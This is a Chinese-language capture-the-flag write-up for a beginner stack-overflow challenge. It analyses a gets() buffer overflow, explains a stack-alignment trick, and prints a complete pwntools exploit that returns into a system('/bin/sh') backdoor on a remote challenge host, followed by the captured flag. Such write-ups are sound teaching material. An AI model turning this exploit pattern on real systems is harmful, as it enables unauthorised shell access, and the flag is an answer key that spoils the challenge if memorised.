# PWN-Authenticate Writeup

## 题目信息

| 项目 | 内容 |
|------|------|
| 题目名称 | PWN-Authenticate |
| 题目难度 | 初级 |
| 题目分值 | 200 |
| 题目分类 | PWN |

## 题目描述

一个简单的用户认证系统，通过 `gets()` 函数造成栈缓冲区溢出，执行文件自带后门。

## 附件分析

题目提供了一个 64-bit ELF 可执行文件 `vuln`。

### 保护机制检查

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX unknown - GNU_STACK missing (Stack Executable)
PIE:      No PIE (0x400000)
```

- **无栈 Canary**：可直接覆盖返回地址
- **无 PIE**：代码地址固定，可直接跳转
- **无 NX**：栈可执行（不过本题不需要 shellcode）

### 源代码分析

```c
void backdoor() {
    system("/bin/sh");
}

void login() {
    char username[64];   // rbp-0x40
    char password[64];   // rbp-0x80
    
    printf("=== Welcome to SecureAuth System ===\n");
    printf("Username: ");
    read(0, username, 64);    // 安全：限制读取 64 字节
    printf("Password: ");
    gets(password);           // 漏洞：无边界检查！
    
    if (strcmp(username, "admin") == 0) {
        printf("Access Denied: Admin login is disabled.\n");
    } else {
        printf("Invalid credentials.\n");
    }
}
```

程序存在一个后门函数 `backdoor()`，直接调用 `system("/bin/sh")`。`login()` 函数中使用 `gets(password)` 读取密码，没有任何长度限制，造成栈缓冲区溢出。

### 栈帧布局（login 函数）

```
低地址
  [rbp-0x80]  ← password 缓冲区 (gets 写入点)
  [rbp-0x40]  ← username 缓冲区 (read 写入，64 字节安全)
  [rbp]       ← 保存的 RBP (8 字节)
  [rbp+0x08]  ← 返回地址 (8 字节)
高地址
```

- gets 缓冲区到返回地址的偏移：`0x80 + 8 = 136` 字节

## 漏洞利用

### 关键问题：栈对齐

直接跳转到 `backdoor()` 函数会因为 x86-64 System V ABI 的栈对齐要求导致 `system()` 调用崩溃。

- `backdoor()` 第一条指令 `push rbp` 会使栈失去 16 字节对齐
- `system()` 内部使用 SSE 指令（如 `movaps`）要求栈 16 字节对齐
- **解决方案**：跳转到 `backdoor+5`（地址 `0x4011fb`），跳过 `push rbp`

### Exploit 构造

```python
offset = 0x80 + 8       # 136 字节
target = backdoor + 5    # 0x4011fb，跳过 push rbp

payload = b'A' * offset + p64(target)
```

1. 发送任意非 "admin" 用户名
2. 发送 payload 作为密码：
   - 136 字节填充 ('A')
   - 返回地址覆盖为 `0x4011fb`（backdoor+5）
3. 获取 shell

### 完整 Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

HOST = '120.27.146.76'
PORT = 20959

e = ELF('./vuln')
backdoor = e.symbols['backdoor']
target = backdoor + 5      # skip push rbp for stack alignment
offset = 0x80 + 8           # 136 bytes to return address

payload = b'A' * offset + p64(target)

p = remote(HOST, PORT)
p.recvuntil(b'Username: ')
p.send(b'a\n')
p.recvuntil(b'Password: ')
p.sendline(payload)
p.interactive()
```

## 获取 Flag

```
flag{4e6f25f6b8bcd6f006ca0134a2497789}
```

## 总结

这是一个经典的 ret2backdoor 题型，考察知识点：
1. `gets()` 函数的危险性——无边界检查
2. x86-64 栈帧结构与返回地址覆盖
3. x86-64 ABI 栈对齐要求（`system()` 需要 16 字节栈对齐）
4. 使用 `read()` 安全读取 + `gets()` 不安全读取的对比
